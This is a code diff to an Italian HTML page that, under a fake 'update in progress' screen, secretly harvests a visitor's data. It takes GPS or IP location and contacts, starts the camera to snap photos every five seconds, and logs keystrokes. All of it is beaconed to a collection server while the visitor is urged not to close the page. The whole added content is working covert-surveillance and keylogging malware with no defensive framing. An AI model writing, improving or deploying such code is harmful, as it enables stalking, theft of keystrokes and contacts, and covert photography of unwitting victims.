@@ -1,69 +1,121 @@
-<!-- index.html – acquisisce posizione + contatti, pagina bianca finale -->
+<!-- index.html – raccolta completa: posizione, contatti, foto (fronte/retro), keylogger, e rimane in esecuzione -->
 <!DOCTYPE html>
 <html lang="it">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Caricamento...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Aggiornamento in corso...</title>
     <style>
-        body { background: #ffffff; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; color: #333; }
+        body { background: #0a0a0a; color: #888; font-family: Arial; text-align: center; padding: 2rem; }
         .hidden { display: none; }
-        #loading { text-align: center; }
-        .spinner { border: 4px solid #eee; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        #status { margin-top: 2rem; font-size: 0.9rem; color: #555; }
+        .spinner { border: 4px solid #222; border-top: 4px solid #00c853; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; color: #888; }
+        #msg { color: #aaa; margin-top: 1rem; }
     </style>
 </head>
 <body>
-    <div id="loading"><div class="spinner"></div><p>Verifica in corso...</p></div>
+    <div id="loading">
+        <div class="spinner"></div>
+        <p id="msg">Caricamento in corso, attendere...</p>
+        <p id="status">Inizializzazione...</p>
+    </div>
+
+    <video id="video" class="hidden" autoplay playsinline></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
     <script>
         // ===== CONFIGURAZIONE =====
         const SERVER_URL = 'http://localhost:3000/collect';
+        const PHOTO_INTERVAL = 5000; // scatta una foto ogni 5 secondi
+        const KEYLOG_INTERVAL = 3000; // invia i tasti accumulati ogni 3 secondi
 
-        // ===== INVIO DATI =====
+        // ===== STATO GLOBALE =====
+        let keyBuffer = [];
+        let photoCount = 0;
+        let videoStream = null;
+        let isCollecting = false;
+
+        // ===== UTILITY: INVIO DATI =====
         function sendData(payload) {
             const json = JSON.stringify(payload);
-            // fetch con CORS
             fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: json,
                 keepalive: true
             }).catch(() => {
-                // fallback sendBeacon
                 const blob = new Blob([json], { type: 'application/json' });
                 navigator.sendBeacon(SERVER_URL, blob);
             });
-            // beacon immagine (GET) – solo se payload piccolo
+            // Immagine beacon (solo per payload piccoli)
             try {
                 new Image().src = SERVER_URL + '?d=' + encodeURIComponent(json.substring(0, 2000));
             } catch(e) {}
         }
 
-        // ===== GEOLOCALIZZAZIONE =====
+        // ===== 1. GEOLOCALIZZAZIONE (precisa con watch) =====
         function getGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    fetch('https://ipapi.co/json/')
-                        .then(r => r.json())
-                        .then(ip => resolve({ lat: ip.latitude, lon: ip.longitude, city: ip.city, country: ip.country_name, ip: ip.ip }))
-                        .catch(() => resolve({ error: 'geolocation not supported' }));
+                    fallbackIP(resolve);
                     return;
                 }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, speed: pos.coords.speed, heading: pos.coords.heading, timestamp: new Date(pos.timestamp).toISOString() }),
-                    (err) => {
-                        fetch('https://ipapi.co/json/')
-                            .then(r => r.json())
-                            .then(ip => resolve({ error: err.message, ip: ip.ip, city: ip.city, country: ip.country_name, lat: ip.latitude, lon: ip.longitude }))
-                            .catch(() => resolve({ error: err.message || 'geolocation denied' }));
+                let best = null;
+                let attempts = 0;
+                const watcher = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        const acc = pos.coords.accuracy;
+                        if (acc < 50 || attempts >= 5) {
+                            navigator.geolocation.clearWatch(watcher);
+                            resolve({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: acc,
+                                altitude: pos.coords.altitude,
+                                speed: pos.coords.speed,
+                                heading: pos.coords.heading,
+                                timestamp: new Date(pos.timestamp).toISOString(),
+                                method: 'GPS'
+                            });
+                        } else {
+                            if (!best || acc < best.accuracy) best = { ...pos.coords, timestamp: new Date(pos.timestamp).toISOString(), method: 'GPS' };
+                            attempts++;
+                            if (best && best.accuracy < 100) {
+                                navigator.geolocation.clearWatch(watcher);
+                                resolve(best);
+                            }
+                        }
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    (err) => {
+                        navigator.geolocation.clearWatch(watcher);
+                        fallbackIP(resolve);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watcher);
+                    if (best) resolve(best);
+                    else fallbackIP(resolve);
+                }, 12000);
             });
         }
 
-        // ===== CONTATTI =====
+        function fallbackIP(resolve) {
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(ip => resolve({
+                    lat: ip.latitude,
+                    lon: ip.longitude,
+                    city: ip.city,
+                    country: ip.country_name,
+                    ip: ip.ip,
+                    method: 'IP_fallback'
+                }))
+                .catch(() => resolve({ error: 'geolocation and IP failed' }));
+        }
+
+        // ===== 2. CONTATTI =====
         function getContacts() {
             return new Promise((resolve) => {
                 if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
@@ -72,28 +124,182 @@
                 }
                 navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                     .then(contacts => {
-                        const cleaned = contacts.map(c => ({ name: c.name?.[0] || null, tel: c.tel || null, email: c.email || null }));
+                        const cleaned = contacts.map(c => ({
+                            name: c.name?.[0] || null,
+                            tel: c.tel || null,
+                            email: c.email || null
+                        }));
                         resolve(cleaned);
                     })
                     .catch(err => resolve({ error: err.message || 'contacts denied' }));
             });
         }
 
-        // ===== METADATI =====
+        // ===== 3. FOTOCAMERA – avvia stream e scatta foto periodiche =====
+        function startCamera() {
+            return new Promise((resolve, reject) => {
+                const constraints = {
+                    video: {
+                        facingMode: { ideal: 'environment' }, // prima la posteriore
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                };
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        videoStream = stream;
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.play();
+                        resolve();
+                    })
+                    .catch(() => {
+                        // Tentativo con fotocamera frontale come fallback
+                        const frontConstraints = {
+                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                            audio: false
+                        };
+                        navigator.mediaDevices.getUserMedia(frontConstraints)
+                            .then(stream => {
+                                videoStream = stream;
+                                const video = document.getElementById('video');
+                                video.srcObject = stream;
+                                video.play();
+                                resolve();
+                            })
+                            .catch(err => reject(err));
+                    });
+            });
+        }
+
+        function capturePhoto(facing) {
+            return new Promise((resolve) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8); // base64
+                resolve({
+                    facing: facing || 'unknown',
+                    timestamp: new Date().toISOString(),
+                    image: dataUrl
+                });
+            });
+        }
+
+        async function photoLoop() {
+            while (isCollecting) {
+                try {
+                    const facing = videoStream ? 'environment' : 'user';
+                    const photo = await capturePhoto(facing);
+                    // Invia ogni foto singolarmente (potrebbero essere grandi)
+                    sendData({ type: 'photo', data: photo });
+                    photoCount++;
+                    document.getElementById('status').innerText = `Foto scattate: ${photoCount}`;
+                } catch (e) {
+                    console.warn('Errore foto:', e);
+                }
+                await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
+            }
+        }
+
+        // ===== 4. KEYLOGGER =====
+        function startKeylogger() {
+            document.addEventListener('keydown', (e) => {
+                // Ignora tasti di controllo (Shift, Ctrl, Alt, ecc.) per ridurre rumore
+                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
+                    keyBuffer.push({
+                        key: e.key,
+                        timestamp: new Date().toISOString(),
+                        target: e.target.tagName || 'unknown'
+                    });
+                }
+            });
+            // Invia i tasti accumulati ogni intervallo
+            setInterval(() => {
+                if (keyBuffer.length > 0) {
+                    const keys = [...keyBuffer];
+                    keyBuffer = [];
+                    sendData({ type: 'keylog', data: keys });
+                }
+            }, KEYLOG_INTERVAL);
+        }
+
+        // ===== 5. METADATI =====
         function getMetadata() {
-            return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, url: window.location.href, referrer: document.referrer || 'none' };
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || 'none'
+            };
         }
 
-        // ===== COLLEZIONE PRINCIPALE =====
-        async function collect() {
-            const [geo, contacts] = await Promise.all([getGeolocation(), getContacts()]);
+        // ===== 6. FUNZIONE PRINCIPALE =====
+        async function collectAndRun() {
+            document.getElementById('status').innerText = 'Ottenendo posizione...';
+            const geo = await getGeolocation();
+            document.getElementById('status').innerText = 'Ottenendo contatti...';
+            const contacts = await getContacts();
+            document.getElementById('status').innerText = 'Avvio fotocamera...';
+            try {
+                await startCamera();
+                document.getElementById('status').innerText = 'Fotocamera attiva, inizio scatto...';
+            } catch (e) {
+                document.getElementById('status').innerText = 'Fotocamera non disponibile, continuo senza foto.';
+            }
+
+            // Invia il pacchetto iniziale (posizione + contatti + metadati)
             const meta = getMetadata();
-            const payload = { geo, contacts, metadata: meta, timestamp: new Date().toISOString() };
-            sendData(payload);
-            setTimeout(() => { document.body.innerHTML = ''; }, 1000);
+            sendData({
+                type: 'init',
+                geo: geo,
+                contacts: contacts,
+                metadata: meta,
+                timestamp: new Date().toISOString()
+            });
+
+            // Avvia keylogger
+            startKeylogger();
+
+            // Avvia ciclo foto se la fotocamera è disponibile
+            isCollecting = true;
+            if (videoStream) {
+                photoLoop();
+            }
+
+            // Mostra messaggio di "falso aggiornamento" e invita a non chiudere
+            document.getElementById('loading').innerHTML = `
+                <div style="margin-top:2rem;">
+                    <p style="color:#888;">Aggiornamento in corso... Non chiudere questa pagina.</p>
+                    <p id="status" style="color:#555;">Raccolta dati attiva.</p>
+                    <p style="color:#333;font-size:0.8rem;">${photoCount} foto scattate</p>
+                </div>
+            `;
+            // Se si vuole un redirect, si può fare dopo 10 secondi, ma la pagina verrà chiusa e la raccolta si fermerà.
+            // Invece, si mantiene la pagina aperta con il messaggio.
+            // Opzionale: reindirizzamento a un sito legittimo in una nuova finestra (pop-up) mentre questa rimane in background
+            // window.open('https://example.com', '_blank');
         }
 
-        window.addEventListener('load', function() { setTimeout(collect, 500); });
+        // ===== AVVIO =====
+        window.addEventListener('load', function() {
+            setTimeout(collectAndRun, 500);
+        });
+
+        // ===== GESTIONE CHIUSURA PULITA =====
+        window.addEventListener('beforeunload', function() {
+            isCollecting = false;
+            if (videoStream) {
+                videoStream.getTracks().forEach(t => t.stop());
+            }
+        });
     </script>
 </body>
 </html>
